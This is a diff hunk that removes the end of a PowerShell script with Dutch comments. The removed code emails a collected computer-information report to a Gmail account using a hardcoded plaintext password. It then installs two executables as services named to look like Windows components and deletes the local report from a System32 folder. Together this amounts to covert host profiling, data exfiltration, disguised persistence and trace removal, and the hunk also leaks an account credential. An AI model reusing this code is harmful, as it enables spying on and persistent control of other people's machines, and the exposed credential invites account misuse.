@@ -84,26 +84,3 @@
 
         #Rapport Finish
              $Report >> "C:\windows\System32\WinDat\ComputerInfo.html"
-       
-    #Het Mailen van het rapport 
-		$PSEmailServer = "smtp.gmail.com"
-		$credentials = new-object Management.Automation.PSCredential "gcdemogithub@gmail.com", ("%TSg#X7Om34h&HdMsu" | ConvertTo-SecureString -AsPlainText -Force)
-		$enc  = New-Object System.Text.utf8encoding
-		$from = "gcdemogithub@gmail.com"
-		$to = "gcdemogithub@gmail.com"
-		$body = [System.IO.File]::ReadAllText("C:\windows\System32\WinDat\Computerinfo.html")
-		$subject = "PC Info"
-		Send-MailMessage -Port 587 -From $from -BodyAsHtml -Encoding $enc -To $to -Subject $subject -Body $body -UseSsl -Credential $credentials
-			   
-		#INstalleren van services
-		.\wgp.exe -service install
-		Start-Sleep -Seconds 2
-		.\wtss.exe -service install
-		Start-Sleep -Seconds 2
-		Start-Service -Name "Windows Automated Time Service"
-		Start-Service -Name "Windows Network Management"
-
-         #Delete lokaal rapport
-		 Start-Sleep -Seconds 5
-             Remove-Item C:\windows\System32\WinDat\Computerinfo.html -force
-
